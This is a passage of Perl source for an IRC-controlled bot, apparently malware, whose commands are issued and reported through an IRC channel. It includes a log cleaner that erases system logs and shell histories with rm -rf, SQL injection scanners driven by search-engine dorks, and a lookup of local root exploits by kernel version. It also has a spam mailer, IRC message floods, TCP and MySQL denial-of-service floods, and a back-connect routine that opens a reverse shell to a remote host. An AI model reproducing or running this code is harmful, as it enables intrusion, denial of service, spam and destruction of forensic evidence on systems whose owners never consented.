wait\");\n    system 'rm -rf /var/log/lastlog';\n    system 'rm -rf /var/log/wtmp';\n   system 'rm -rf /etc/wtmp';\n   system 'rm -rf /var/run/utmp';\n   system 'rm -rf /etc/utmp';\n   system 'rm -rf /var/log';\n   system 'rm -rf /var/logs';\n   system 'rm -rf /var/adm';\n   system 'rm -rf /var/apache/log';\n   system 'rm -rf /var/apache/logs';\n   system 'rm -rf /usr/local/apache/log';\n   system 'rm -rf /usr/local/apache/logs';\n   system 'rm -rf /root/.bash_history';\n   system 'rm -rf /root/.ksh_history';\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Log-Cleaner\u0002\u000312]  LogCleaner :. |  All default log and bash_history files erased\");\n      sleep 1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Log-Cleaner\u0002\u000312]  LogCleaner :. |  Now Erasing the rest of the machine log files\");\n   system 'find / -name *.bash_history -exec rm -rf {} \\;';\n   system 'find / -name *.bash_logout -exec rm -rf {} \\;';\n   system 'find / -name \"log*\" -exec rm -rf {} \\;';\n   system 'find / -name *.log -exec rm -rf {} \\;';\n      sleep 1;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Log-Cleaner\u0002\u000312]  LogCleaner :. |  Done! All logs erased\");\n      }\n######################\n# End of Log Cleaner # \n######################\n######################\n#              SQL SCANNER              #\n######################\n\nif ($funcarg =~ /^sql2\\s+(.*?)\\s+(.*)\\s+(\\d+)/){\n   if (my $pid = fork) {\n      waitpid($pid, 0);\n   } else {\n      if (my $d=fork()) {\n         addproc($d,\"[SQL2] $2\");\n         exit;\n      } else {\n         \n         my $bug=$1;\n         my $dork=$2;\n         my $contatore=0;\n         my ($type,$space);\n         my %hosts;\n         my $columns=$3;\n         \n                        ### Start Message\n                        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312] Starting Scan for \u00034$bug $dork\");\n                        sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312] Initializing on \u000345 \u000312Search Engines \");\n                        ### End of Start Message\n            # Starting Google\n            my @glist=&google($dork);\n                        sendraw($IRC_cur_socket, \"PRIVMSG $printl \u0002\u001f\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u0002\u001f\u0003 \u0002\u00032G\u00034o\u00038o\u00032g\u00039l\u00034e\u0003 \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@glist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n                        my @mlist=&msn($dork);\n                        my @asklist=&ask($dork);\n                        my @allist=&alltheweb($dork);\n                        my @aollist=&aol($dork);\n                        my @lycos=&lycos($dork);\n                        my @ylist=&yahoo($dork);\n                        my @mzlist=&mozcox($dork);\n                        my @mamalist&mamma($dork);\n                        my @hlist=&hotcox($dork);\n                        my @altlist=&altavista($dork);\n                        my @slist=&search($dork);\n                        my @ulist=&uol($dork);\n                        my @fireball=&fireball($dork);   \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312\u0002\u001f\u0003 \u0002\u00032G\u00034o\u00038o\u00032g\u00039l\u00034e\u0003 \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@glist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003MSN \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@mlist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003AllTheWeb \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@allist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003Ask.com \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@asklist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003AOL \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@aollist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003Lycos \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@lycos).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003Yahoo! \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@ylist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003Mozcox \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@mzlist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003Mama \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@mamalist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003Hotcox \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@hlist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003Altavista \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@altlist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003Search[dot]com \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@slist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003UoL \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@ulist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039SQL-Scanner\u0002\u000312]\u000312 \u0003FireBall \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@flist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n            \n            push(my @tot, @glist, @mlist, @alist, @allist, @asklist, @aollist, @lycos, @ylist, @mzlist, @mamalist, @hlist,@altlist, @slist, @ulist, @flist );\n            \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,16 [ scan ] \u0003[ \u000312Filtruje\u00034 ][ \".scalar(@tot).\" \u000312Stron\u00034 ] \");\n            my @puliti=&unici(@tot);\n            \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,16 [ SQL ] \u0003[ \u000312$dork\u00034 ][ \".scalar(@puliti).\" \u000312Stron\u00034 ] \");\n         \n            my $uni=scalar(@puliti);\n                  \n                  foreach my $sito (@puliti) {\n              \n                  $contatore++;\n                    if ($contatore %5==0){\n                       sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,16 [ scan ] \u0003[ \u000312Skanuje\u00034 ][ \".$contatore.\" \u000312z\u00034 \".$uni. \" \u000312Stron\u00034 ] \");\n                    }\n                  sleep 3;\n                    if ($contatore==$uni-1){\n                     sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,16 [ scan ] \u0003[ \u000312Koniec:\u00034 $bug $dork ] \");\n                    }   \n                  sleep 3;\n                    my $site=\"http://\".$sito.$bug;\n                  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,16 [ sql ] \u0003[ \u000312Sprawdzam: \u00034$site \u000312cols: \u00034 $columns ] \");\n         \n         $w=int rand(999);   \n         $w=$w*1000;\n         for($i=1;$i<=$columns;$i++) {\n            splice(@col,0,$#col+1);\n            for($j=1;$j<=$i;$j++) {\n               push(@col,$w+$j);\n            }   \n            $tmp=join(\",\",@col);\n            $test=$site.\"-1+UNION+SELECT+\".$tmp.\"/*\";\n            print $test.\"\\n\";\n            $result=get_html($test);\n            $result =~ s/\\/\\*\\*\\///g;\n            $result =~ s/UNION([^(\\*)]*)//g;\n            for($k=1;$k<=$i;$k++) {\n               $n=$w+$k;\n                  if($result =~ /$n/){\n                     splice(@col2,0,$#col2+1);\n                        for($s=1;$s<=$i;$s++) {\n                           push(@col2,$s); \n                        }\n                     $tmp2=join(\",\",@col2);\n                     $test2=\"+UNION+SELECT+\".$tmp2.\"/*\";\n                     push @{$dane{$test2}},$k;\n                  } \n            }\n         }\n         for $klucz (keys %dane) {\n            foreach $i(@{$dane{$klucz}}) {\n               $klucz =~ s/$i/\u0002$i\u0002/;\n            }\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00038,1 [ \u0002vuln\u0002 ] \u00039,1 [  \".$site.\"-1\".$klucz.\"  ] \u0003 \");\n         }\n         %dane=();      \n            }\n      }\n   delproc($$);\n   exit;\n   }\n}\n#######  SQL SCANNER  #########\n\nif ($funcarg =~ /^autoscan\\s+(.*)\\s+http\\:\\/\\/(.*?)\\/(.*?)\\s+(\\d+)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (my $d=fork()) {\naddproc($d,\"[String] $2\");\nexit;\n} else {\n      $kto = $1;\n      $host = $2;\n      $skrypt = $3;\n      $czekac=$4;\n      \n      #http://ttl.ugu.pl/string/index.php\n      my $socke = IO::Socket::INET->new(PeerAddr=>$host,PeerPort=>\"80\",Proto=>\"tcp\") or return;\n      print $socke \"GET /$skrypt HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\n      \n      my @r = <$socke>;\n      $page=\"@r\";\n   \n      $page =~ s/!scan(\\s+)//g;\n      $page =~ s/!scan(.)//g;\n      $page =~ s/\\<.*\\>//g;\n      \n      @lines = split (/\\n/, $page);\n      $ile=scalar(@lines);\n            \n      \n      for($i=9;$i<=$ile;$i+=4) {\n\n         for($j=0;$j<4;$j++) {\n            #print $lines[$i+$j].\"\\n\";\n            \n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :$kto $lines[$i+$j]\");\n            \n            sleep 10;\n         }\n         \n         sleep $czekac*60;\n      }\n\n   }\n      delproc($$);\n      exit;\n   }\n}\n\n\n\n\n\n#######  SQL SCANNER  #########\n\nif ($funcarg =~ /^sql\\s+(.*)\\s+(\\d+)/){\n   if (my $pid = fork()) {\n      waitpid($pid, 0);\n   } else {\n      if (my $d=fork()) {\n         addproc($d,\"[SQL1] $1 $2\");\n         exit;\n      } else {\n         my $site=$1;\n         my $columns=$2;\n         sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,16 [ sql ] \u0003[ \u000312Sprawdzam: \u00034$site \u000312cols: \u00034 $columns ] \");\n         \n         $w=int rand(999);   \n         $w=$w*1000;\n         for($i=1;$i<=$columns;$i++) {\n            splice(@col,0,$#col+1);\n            for($j=1;$j<=$i;$j++) {\n               push(@col,$w+$j);\n            }   \n            $tmp=join(\",\",@col);\n            $test=$site.$bug.\"-1+UNION+SELECT+\".$tmp.\"/*\";\n                        #$result=query($test);\n            $result=get_html($test);\n   \n            $result =~ s/\\/\\*\\*\\///g;\n            $result =~ s/UNION([^(\\*)]*)//g;\n            for($k=1;$k<=$i;$k++) {\n               $n=$w+$k;\n                  if($result =~ /$n/){\n                     splice(@col2,0,$#col2+1);\n                        for($s=1;$s<=$i;$s++) {\n                           push(@col2,$s); \n                        }\n                     $tmp2=join(\",\",@col2);\n                     $test2=\"+UNION+SELECT+\".$tmp2.\"/*\";\n                     push @{$dane{$test2}},$k;\n                  } \n            }\n         }\n         for $klucz (keys %dane) {\n            foreach $i(@{$dane{$klucz}}) {\n               $klucz =~ s/$i/\u0002$i\u0002/;\n            }\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00038,1 [ \u0002vuln\u0002 ] \u00039,1 [  \".$site.$bug.\"-1\".$klucz.\"  ] \u0003 \");\n         }\n         sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034,16 [ sql ] \u0003[ \u000312Koniec \u00034 ] \");      \n      }\n   delproc($$);\n   exit;\n   }\n}\n#######  SQL SCANNER  #########\n######################\n#        Rootable                                     #\n######################\nif ($funcarg =~ /^rootable/) { \nmy $khost = `uname -r`;\nmy $currentid = `whoami`;\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Rootable\u0002\u000312] Currently you are \".$currentid.\" \");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Rootable\u0002\u000312] The kernel of this box is \".$khost.\" \");\nchomp($khost);\n\n   my %h;\n   $h{'w00t'} = { \n      vuln=>['2.4.18','2.4.10','2.4.21','2.4.19','2.4.17','2.4.16','2.4.20'] \n   };\n   \n   $h{'brk'} = {\n      vuln=>['2.4.22','2.4.21','2.4.10','2.4.20'] \n   };\n   \n   $h{'ave'} = {\n      vuln=>['2.4.19','2.4.20'] \n   };\n   \n   $h{'elflbl'} = {\n      vuln=>['2.4.29'] \n   };\n   \n   $h{'elfdump'} = {\n      vuln=>['2.4.27']\n   };\n   \n   $h{'expand_stack'} = {\n      vuln=>['2.4.29'] \n   };\n   \n   $h{'h00lyshit'} = {\n      vuln=>['2.6.8','2.6.10','2.6.11','2.6.9','2.6.7','2.6.13','2.6.14','2.6.15','2.6.16','2.6.2']\n   };\n   \n   $h{'kdump'} = {\n      vuln=>['2.6.13'] \n   };\n   \n   $h{'km2'} = {\n      vuln=>['2.4.18','2.4.22']\n   };\n   \n   $h{'krad'} = {\n      vuln=>['2.6.11']\n   };\n   \n   $h{'krad3'} = {\n      vuln=>['2.6.11','2.6.9']\n   };\n   \n   $h{'local26'} = {\n      vuln=>['2.6.13']\n   };\n   \n   $h{'loko'} = {\n      vuln=>['2.4.22','2.4.23','2.4.24'] \n   };\n   \n   $h{'mremap_pte'} = {\n      vuln=>['2.4.20','2.2.25','2.4.24'] \n   };\n   \n   $h{'newlocal'} = {\n      vuln=>['2.4.17','2.4.19','2.4.18'] \n   };\n   \n   $h{'ong_bak'} = {\n      vuln=>['2.4.','2.6.'] \n   };\n   \n   $h{'ptrace'} = {\n      vuln=>['2.2.','2.4.22'] \n   };\n   \n   $h{'ptrace_kmod'} = {\n      vuln=>['2.4.2'] \n   };\n   \n   $h{'ptrace24'} = {\n      vuln=>['2.4.9'] \n   };\n   \n   $h{'pwned'} = {\n      vuln=>['2.4.','2.6.'] \n   };\n   \n   $h{'py2'} = {\n      vuln=>['2.6.9','2.6.17','2.6.15','2.6.13'] \n   };\n   \n   $h{'raptor_prctl'} = {\n      vuln=>['2.6.13','2.6.17','2.6.16','2.6.13'] \n   };\n   \n   $h{'prctl3'} = {\n      vuln=>['2.6.13','2.6.17','2.6.9'] \n   };\n   \n   $h{'remap'} = {\n      vuln=>['2.4.'] \n   };\n   \n   $h{'rip'} = {\n      vuln=>['2.2.'] \n   };\n   \n   $h{'stackgrow2'} = {\n      vuln=>['2.4.29','2.6.10'] \n   };\n   \n   $h{'uselib24'} = {\n      vuln=>['2.4.29','2.6.10','2.4.22','2.4.25'] \n   };\n   \n   $h{'newsmp'} = {\n      vuln=>['2.6.'] \n   };\n   \n   $h{'smpracer'} = {\n      vuln=>['2.4.29'] \n   };\n   \n   $h{'loginx'} = {\n      vuln=>['2.4.22'] \n   };\n   \n   $h{'exp.sh'} = {\n      vuln=>['2.6.9','2.6.10','2.6.16','2.6.13'] \n   };\n   \n   $h{'prctl'} = {\n      vuln=>['2.6.'] \n   };\n   \n   $h{'kmdx'} = {\n      vuln=>['2.6.','2.4.'] \n   };\n   \n   $h{'raptor'} = {\n      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] \n   };\n   \n   $h{'raptor2'} = {\n      vuln=>['2.6.13','2.6.14','2.6.15','2.6.16'] \n   };\n   \nforeach my $key(keys %h){\nforeach my $kernel ( @{ $h{$key}{'vuln'} } ){ \n   if($khost=~/^$kernel/){\n   chop($kernel) if ($kernel=~/.$/);\n   sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Rootable\u0002\u000312] Possible Local Root Exploits: \". $key .\" \");\n      }\n   }\n}\n}\n######################\n#       MAILER       # \n######################\nif ($funcarg =~ /^sendmail\\s+(.*)\\s+(.*)\\s+(.*)\\s+(.*)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Mailer\u0002\u000312]  Mailer :. |  Sending Mail to : 2 $3\");\n$subject = $1;\n$sender = $2;\n$recipient = $3;\n@corpo = $4;\n$mailtype = \"content-type: text/html\";\n$sendmail = '/usr/sbin/sendmail';\nopen (SENDMAIL, \"| $sendmail -t\");\nprint SENDMAIL \"$mailtype\\n\";\nprint SENDMAIL \"Subject: $subject\\n\";\nprint SENDMAIL \"From: $sender\\n\";\nprint SENDMAIL \"To: $recipient\\n\\n\";\nprint SENDMAIL \"@corpo\\n\\n\";\nclose (SENDMAIL);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Mailer\u0002\u000312]   Mailer :. |  Mail Sent To : 2 $recipient\");\n}\n######################\n#   End of MAILER    # \n######################\n# A /tmp cleaner\nif ($funcarg =~ /^cleartmp/) { \n    system 'cd /tmp;rm -rf *';\n         sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039TMPCleaner\u0002\u000312] /tmp is Cleaned\");\n         }\n#-#-#-#-#-#-#-#-#\n# Flooders IRC  #\n#-#-#-#-#-#-#-#-#         \n# msg, @msgflood <who>\nif ($funcarg =~ /^msgflood (.+?) (.*)/) {\n   for($i=0; $i<=10; $i+=1){\n      sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" \".$2);\n   }\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039MSGFlood\u0002\u000312]\u000314 Excecuted on \".$1.\" \");\n}\n         \n# dccflood, @dccflood <who>\nif ($funcarg =~ /^dccflood (.*)/) {\n   for($i=0; $i<=10; $i+=1){\n      sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001DCC CHAT chat 1121485131 1024\\001\\n\");\n   }\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039DCCFlood\u0002\u000312]\u000314 Excecuted on \".$1.\" \");\n}      \n# ctcpflood, @ctcpflood <who>\nif ($funcarg =~ /^ctcpflood (.*)/) {\n   for($i=0; $i<=10; $i+=1){\n      sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001VERSION\\001\\n\");\n      sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001PING\\001\\n\");\n   }\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039CTCPFlood\u0002\u000312]\u000314 Excecuted on \".$1.\" \");\n}      \n# noticeflood, @noticeflood <who>\n   if ($funcarg =~ /^noticeflood (.*)/) {\n      for($i=0; $i<=10; $i+=1){\n         sendraw($IRC_cur_socket, \"NOTICE \".$1.\" :w3tFL00D\\n\");\n   }\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039NoticeFlood\u0002\u000312]\u000314 Excecuted on \".$1.\" \");\n}      \n# Channel Flood, @channelflood\nif ($funcarg =~ /^channelflood/) {\n   for($i=0; $i<=25; $i+=1){ \n      sendraw($IRC_cur_socket, \"JOIN #\".(int(rand(99999))) );\n   }\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039ChannelFlood\u0002\u000312]\u000314 Excecuted \");\n}\n# Maxi Flood, @maxiflood\nif ($funcarg =~ /^maxiflood(.*)/) {\n   for($i=0; $i<=15; $i+=1){\n         sendraw($IRC_cur_socket, \"NOTICE \".$1.\" :w3tFl00D\\n\");\n         sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001VERSION\\001\\n\");\n         sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :\\001PING\\001\\n\");\n         sendraw($IRC_cur_socket, \"PRIVMSG \".$1.\" :w3tFl00D\\n\");         \n   }\n      sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039M4Xi-Fl00d\u0002\u000312]\u000314 Excecuted on \".$1.\" \");\n}\n######################\n#  irc    #\n######################\n         if ($funcarg =~ /^reset/) {\n            sendraw($IRC_cur_socket, \"QUIT :\");\n         }\n         if ($funcarg =~ /^join (.*)/) {\n            sendraw($IRC_cur_socket, \"JOIN \".$1);\n         }\n         if ($funcarg =~ /^part (.*)/) {\n            sendraw($IRC_cur_socket, \"PART \".$1);\n         }\n         if ($funcarg =~ /^voice (.*)/) { \n            sendraw($IRC_cur_socket, \"MODE $printl +v \".$1);\n           }\n         if ($funcarg =~ /^dcoxice (.*)/) { \n            sendraw($IRC_cur_socket, \"MODE $printl -v \".$1);\n           }\n         if ($funcarg =~ /^halfop (.*)/) { \n            sendraw($IRC_cur_socket, \"MODE $printl +h \".$1);\n           }\n         if ($funcarg =~ /^dehalfop (.*)/) { \n            sendraw($IRC_cur_socket, \"MODE $printl -h \".$1);\n           }\n         if ($funcarg =~ /^owner (.*)/) { \n            sendraw($IRC_cur_socket, \"MODE $printl +q \".$1);\n           }\n         if ($funcarg =~ /^deowner (.*)/) { \n            sendraw($IRC_cur_socket, \"MODE $printl -q \".$1);\n         }\n         if ($funcarg =~ /^op (.*)/) { \n            sendraw($IRC_cur_socket, \"MODE $printl +o \".$1);\n           }         \n         if ($funcarg =~ /^deop (.*)/) { \n            sendraw($IRC_cur_socket, \"MODE $printl -o \".$1);\n           }\n######################\n#End of Join And Part#\n######################\n######################\n#     TCPFlood       #\n######################\n\n         if ($funcarg =~ /^tcpflood\\s+(.*)\\s+(\\d+)\\s+(\\d+)/) {\n            sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039TCP-DDOS\u0002\u000312] Attacking \u00034 \".$1.\":\".$2.\" \u000312for \u00034 \".$3.\" \u000312seconds.\");\n            my $itime = time;\n            my ($cur_time);\n            $cur_time = time - $itime;\n            while ($3>$cur_time){\n               $cur_time = time - $itime;\n               &tcpflooder(\"$1\",\"$2\",\"$3\");\n            }\n            sendraw($IRC_cur_socket,\"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039TCP-DDOS\u0002\u000312] Attack done \u00034 \".$1.\":\".$2.\".\");\n         }\n######################\n#  End of TCPFlood   #\n######################\n######################\n#               SQL Fl00dEr                     #\n######################\nif ($funcarg =~ /^sqlflood\\s+(.*)\\s+(\\d+)/) {\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SQL-DDOS\u0002\u000312] Attacking\u0003 \u00034 \".$1.\" \u000312 on port 3306 for \u00034 \".$2.\" \u000312 seconds \u0003.\");\nmy $itime = time;\nmy ($cur_time);\n$cur_time = time - $itime;\nwhile ($2>$cur_time){\n$cur_time = time - $itime;\n   my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>3306);\n   print $socket \"GET / HTTP/1.1\\r\\nAccept: */*\\r\\nHost: \".$1.\"\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\";\nclose($socket);\n}\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039SQL-DDOS\u0002\u000312] Attacking done\u0003 \u00034 \".$1.\".\");\n}\n######################\n#   Back Connect     #\n\n######################\n         if ($funcarg =~ /^back\\s+(.*)\\s+(\\d+)/) {\n            my $host = \"$1\";\n            my $porta = \"$2\";\n            my $proto = getprotobyname('tcp');\n            my $iaddr = inet_aton($host);\n            my $paddr = sockaddr_in($porta, $iaddr);\n            my $shell = \"/bin/sh -i\";\n            if ($^O eq \"MSWin32\") {\n               $shell = \"cmd.exe\";\n            }\n            socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die \"socket: $!\";\n            connect(SOCKET, $paddr) or die \"connect: $!\";\n            open(STDIN, \">&SOCKET\");\n            open(STDOUT, \">&SOCKET\");\n            open(STDERR, \">&SOCKET\");\n            system(\"$shell\");\n            close(STDIN);\n            close(STDOUT);\n            close(STDERR);\n            if ($estatisticas){\n               sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Back-Connect\u0002\u000312] Connecting to \u00034 $host:$porta\");\n            }\n         }\n######################\n#End of  Back Connect#\n######################\n######################\n#    MULTI SCANNER   #\n######################\nif ($funcarg =~ /^multiscan\\s+(.*?)\\s+(.*)/){\nif (my $pid = fork) {\nwaitpid($pid, 0);\n} else {\nif (fork) {\nexit;\n} else {\nmy $bug=$1;\nmy $dork=$2;\nmy $contatore=0;\n                  my ($type,$space);\n                  my %hosts;\n                  ### Start Message\n                  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Multi-Scan\u0002\u000312] Starting Scan for \u00034$bug $dork\");\n                  sendraw($IRC_cur_socket, \"PRIVMSG $printl :\u000312[\u0002\u00034@\u00039Multi-Scan\u0002\u000312] Initializing on \u000345 \u000312Search Engines \");\n                  ### End of Start Message\n# Starting Google\n   my @glist=&google($dork);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl \u0002\u001f\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u0002\u001f\u0003 \u0002\u00032G\u00034o\u00038o\u00032g\u00039l\u00034e\u0003 \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@glist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\n   my @mlist=&msn($dork);\n   my @asklist=&ask($dork);\n   my @allist=&alltheweb($dork);\n   my @aollist=&aol($dork);\n   my @lycos=&lycos($dork);\n   my @ylist=&yahoo($dork);\n   my @mzlist=&mozcox($dork);\n   my @mamalist&mamma($dork);\n   my @hlist=&hotcox($dork);\n   my @altlist=&altavista($dork);\n   my @slist=&search($dork);\n   my @ulist=&uol($dork);\n   my @fireball=&fireball($dork);\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312\u0002\u001f\u0003 \u0002\u00032G\u00034o\u00038o\u00032g\u00039l\u00034e\u0003 \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@glist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003MSN \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@mlist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003AllTheWeb \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@allist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003Ask.com \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@asklist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003AOL \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@aollist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003Lycos \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@lycos).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003Yahoo! \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@ylist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003Mozcox \u0002\u001f\u00034[\u0003\u0002\u001f\".scalar(@mzlist).\"\u0002\u001f\u00034]\u0003\u0002\u001f Sites\");\nsendraw($IRC_cur_socket, \"PRIVMSG $printl :\u00034[\u0002\u00034@\u00039Multi-Scan\u0002\u000312]\u000312 \u0003Mama 